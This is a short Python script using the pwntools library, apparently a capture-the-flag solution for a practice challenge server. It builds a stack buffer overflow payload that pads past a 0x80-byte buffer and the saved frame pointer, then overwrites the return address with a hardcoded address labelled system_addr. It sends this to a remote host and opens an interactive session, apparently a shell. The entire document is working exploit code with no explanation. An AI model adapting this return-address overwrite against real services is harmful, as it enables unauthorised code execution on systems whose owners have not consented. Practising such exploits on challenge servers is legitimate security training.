from pwn import *

system_addr = 0x400596
payload=bytes('a'*0x80, 'utf-8') + bytes('a'*8, 'utf-8') + p64(system_addr)
r = remote('pwn2.jarvisoj.com',9881)
r.recvuntil('Hello, World\n')
r.sendline(payload)

r.interactive()